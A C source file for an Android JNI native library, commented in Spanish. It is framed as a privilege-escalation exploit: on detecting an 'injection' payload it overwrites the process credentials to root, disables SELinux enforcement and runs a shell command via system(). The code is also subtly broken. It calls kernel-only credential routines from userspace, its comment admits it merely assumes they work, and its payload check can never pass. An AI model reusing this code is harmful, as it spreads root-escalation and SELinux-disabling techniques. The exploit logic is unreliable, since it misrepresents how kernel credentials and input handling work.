#include <jni.h>
#include <android/log.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <grp.h>
#include <sys/syscall.h>
#include <linux/prctl.h>
#include <stdlib.h>
#include "external/kernel_compat.h"

// Incluir los headers reales para SELinux y credenciales.
#include "selinux/selinux.h"   // Declara is_selinux_enabled() y security_setenforce()
#include "external/cred.h"        // Declara get_current_cred() y la estructura cred real

#define LOG_TAG "native_holamundo"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// Función para imprimir el estado real de SELinux.
void print_selinux_status(void) {
    int status = is_selinux_enabled();
    if (status == 1) {
        LOGI("SELinux está habilitado (enforcing)");
    } else if (status == 0) {
        LOGI("SELinux está deshabilitado (permissive o disabled)");
    } else {
        LOGI("Estado de SELinux desconocido: %d", status);
    }
}

// Función para sobrescribir la estructura cred utilizando la implementación real.
void overwrite_cred(void) {
    struct cred *cred_ptr = get_current_cred();
    if (!cred_ptr) {
        LOGE("Error: No se pudo obtener la estructura cred.");
        return;
    }
    // Sobrescribe los campos para escalar privilegios (se asume que esto funciona en el entorno real).
    cred_ptr->uid  = KUIDT_INIT(0);
    cred_ptr->gid  = KGIDT_INIT(0);
    cred_ptr->suid = KUIDT_INIT(0);
    cred_ptr->sgid = KGIDT_INIT(0);
    cred_ptr->euid = KUIDT_INIT(0);
    cred_ptr->egid = KGIDT_INIT(0);

    LOGI("Estructura cred sobrescrita: UID=0, GID=0");
}

// Función para desactivar SELinux utilizando la implementación real.
void disable_selinux(void) {
    if (is_selinux_enabled() == 1) {
        LOGI("Desactivando SELinux...");
        if (security_setenforce(0) == 0) {
            LOGI("SELinux desactivado.");
        } else {
            LOGE("Error al desactivar SELinux.");
        }
    } else {
        LOGI("SELinux ya está desactivado.");
    }
}

// Función para ejecutar un comando con privilegios elevados.
void execute_command(const char *command) {
    LOGI("Ejecutando comando: %s", command);
    int result = system(command);
    if (result == -1) {
        LOGE("Error al ejecutar el comando.");
    } else {
        LOGI("Comando ejecutado con éxito (código de salida: %d).", result);
    }
}

// Función para verificar si el payload sobrescribió los campos críticos.
jboolean verifyInjection(const char *data, size_t len) {
    if (len != 71) {
        LOGE("Longitud del payload incorrecta: %zu (se esperaban 71 bytes)", len);
        return JNI_FALSE;
    }
    if (data[64] == 0x00 && data[65] == 0x00 &&
        data[66] == 0x00 && data[67] == 0x00) {
        LOGI("¡Inyección exitosa! UID modificado a 0.");
        return JNI_TRUE;
    }
    LOGE("Inyección fallida: campos críticos no modificados");
    return JNI_FALSE;
}

// Función JNI para procesar la entrada desde Java.
JNIEXPORT void JNICALL
Java_com_example_binario2_NativeHolaMundoService_processInput(JNIEnv *env, jobject instance, jstring input) {
    LOGI("Entrando a processInput...");

    // Imprime el estado real de SELinux.
    print_selinux_status();

    const char *nativeString = (*env)->GetStringUTFChars(env, input, 0);
    if (!nativeString) {
        LOGE("Error: No se pudo obtener la cadena desde Java.");
        return;
    }
    LOGI("Datos recibidos en C: %s", nativeString);
    size_t len = strlen(nativeString);
    LOGI("Longitud de la entrada: %zu", len);

    if (verifyInjection(nativeString, len)) {
        LOGI("¡Inyección exitosa! Realizando escalada de privilegios...");
        overwrite_cred();
        disable_selinux();
        execute_command("id");
    } else {
        LOGI("La inyección no tuvo éxito. Revisa el payload y el servicio.");
    }
    (*env)->ReleaseStringUTFChars(env, input, nativeString);
    LOGI("Saliendo de processInput.");
}

// Función JNI para verificar la inyección a partir de un arreglo de bytes.
JNIEXPORT jboolean JNICALL
Java_com_example_binario2_NativeHolaMundoService_verifyInjection(JNIEnv *env, jobject instance, jbyteArray data) {
    jbyte *buffer = (*env)->GetByteArrayElements(env, data, NULL);
    jsize length = (*env)->GetArrayLength(env, data);
    jboolean result = verifyInjection((const char *)buffer, (size_t)length);
    (*env)->ReleaseByteArrayElements(env, data, buffer, 0);
    return result;
}





